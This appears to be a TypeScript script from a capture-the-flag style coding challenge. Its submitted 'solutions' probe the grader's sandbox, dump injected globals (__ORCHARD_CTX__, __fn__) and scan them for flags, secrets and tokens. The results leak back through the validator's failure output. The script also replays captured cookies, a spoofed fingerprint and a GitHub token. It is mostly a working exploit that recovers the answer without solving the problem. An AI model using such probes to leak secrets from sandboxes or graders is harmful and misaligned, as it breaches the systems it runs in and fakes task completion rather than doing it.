// v3 validate leaks the code's return value in failedCase.actual. The sandbox injects
// custom globals __ORCHARD_CTX__ and __fn__. Read them straight out — no oracle needed.
//
//   export CHEETCODE_GITHUB_PAT=ghp_...
//   CHEETCODE_GITHUB=<pat-owner-login> \
//   CHEETCODE_FINGERPRINT_HINTS_PATH=recon-output/safari-session-2026-08-28T0008/fingerprint-hints.json \
//   npx tsx src/level1-orchard-dump.ts
//
// ponytail: single-file diagnostic; delete after the flag is recovered.
import { promises as fs } from "node:fs";
import crypto from "node:crypto";
import { loadEnvFile } from "./env.js";
import { buildCookieHeader, buildFingerprintHints } from "./level1/api.js";
import { extractFunctionName } from "./level1/solutions.js";
import type { LevelSession, CheetProblem } from "./level1/types.js";
import { TARGET_URL, STORAGE_STATE_PATH } from "./recon/capture.js";

loadEnvFile();

const github = (process.env.CHEETCODE_GITHUB || "").trim();
if (!github) throw new Error("Set CHEETCODE_GITHUB.");
const storage = JSON.parse(await fs.readFile(STORAGE_STATE_PATH, "utf8"));
const cookie = buildCookieHeader(storage.cookies, new URL(TARGET_URL).hostname);
const hintsPath = process.env.CHEETCODE_FINGERPRINT_HINTS_PATH;
const fingerprintHints = hintsPath
  ? JSON.parse(await fs.readFile(hintsPath, "utf8"))
  : buildFingerprintHints(crypto.randomBytes(16).toString("hex"), Date.now());
const headers: Record<string, string> = {
  "content-type": "application/json",
  referer: TARGET_URL,
  cookie,
  "x-client-fingerprint": fingerprintHints.fingerprintId
};
if (process.env.CHEETCODE_GITHUB_PAT) headers["authorization"] = `Bearer ${process.env.CHEETCODE_GITHUB_PAT}`;

async function post<T>(path: string, body: unknown): Promise<T> {
  const r = await fetch(new URL(path, TARGET_URL), { method: "POST", headers, body: JSON.stringify(body) });
  const text = await r.text();
  if (!r.ok) throw new Error(`${path} ${r.status}: ${text.slice(0, 300)}`);
  return JSON.parse(text) as T;
}

const session = await post<LevelSession>("/api/session", { level: 1, isDev: false, fingerprintHints });
const p = (session.problems as CheetProblem[])[0];
const NAME = extractFunctionName(p.signature)!;

// Deep-serialize an object incl. non-enumerable keys and function sources, since the
// flag might be a getter, a symbol, or produced by __fn__.
const DEEP = `function dump(o){try{
  if(o===null||o===undefined) return String(o);
  if(typeof o==='function') return 'FN:'+Function.prototype.toString.call(o).slice(0,4000);
  if(typeof o!=='object') return typeof o+':'+String(o);
  var out={};
  Object.getOwnPropertyNames(o).forEach(function(k){
    try{var v=o[k]; out[k]= (typeof v==='function')?('FN:'+Function.prototype.toString.call(v).slice(0,2000)):(typeof v==='object'&&v!==null?JSON.stringify(v):String(v)); }
    catch(e){ out[k]='<err '+e+'>'; }
  });
  try{Object.getOwnPropertySymbols(o).forEach(function(s){ out['SYM('+String(s)+')']=String(o[s]); });}catch(e){}
  return JSON.stringify(out);
}catch(e){ return '<dump err '+e+'>'; }}`;

const probes: Record<string, string> = {
  orchard_ctx: `function ${NAME}(){ ${DEEP} return dump(globalThis.__ORCHARD_CTX__); }`,
  orchard_json: `function ${NAME}(){ return JSON.stringify(globalThis.__ORCHARD_CTX__); }`,
  orchard_str: `function ${NAME}(){ return String(globalThis.__ORCHARD_CTX__); }`,
  fn_source: `function ${NAME}(){ return Function.prototype.toString.call(globalThis.__fn__).slice(0,4000); }`,
  fn_ctx_deep: `function ${NAME}(){ ${DEEP} return dump(globalThis.__fn__); }`,
  scan_for_flag: `function ${NAME}(){ var hits=[]; var seen=new Set(); function walk(o,path,d){ if(d>4||o===null||o===undefined||seen.has(o))return; if(typeof o==='object')seen.add(o); if(typeof o==='string'){ if(/flag|fire|\\{|\\}|orchard|secret|token/i.test(o)) hits.push(path+'='+o.slice(0,200)); return;} if(typeof o==='object'){ Object.getOwnPropertyNames(o).forEach(function(k){ try{walk(o[k],path+'.'+k,d+1);}catch(e){} }); } } walk(globalThis.__ORCHARD_CTX__,'ctx',0); walk(globalThis.__fn__,'fn',0); return JSON.stringify(hits); }`
};

for (const [label, code] of Object.entries(probes)) {
  try {
    const res = await post<any>("/api/level-1/validate", { sessionId: session.sessionId, problemId: p.id, code });
    const actual = res?.failedCase?.actual ?? res?.error ?? "(no actual)";
    console.log(`\n### ${label}`);
    console.log(typeof actual === "string" ? actual : JSON.stringify(actual));
  } catch (e) {
    console.log(`\n### ${label}\n  ERROR: ${e instanceof Error ? e.message : String(e)}`);
  }
}
console.log("\n(scan_for_flag lists any string containing flag/fire/{}/orchard/secret found in the injected context)");
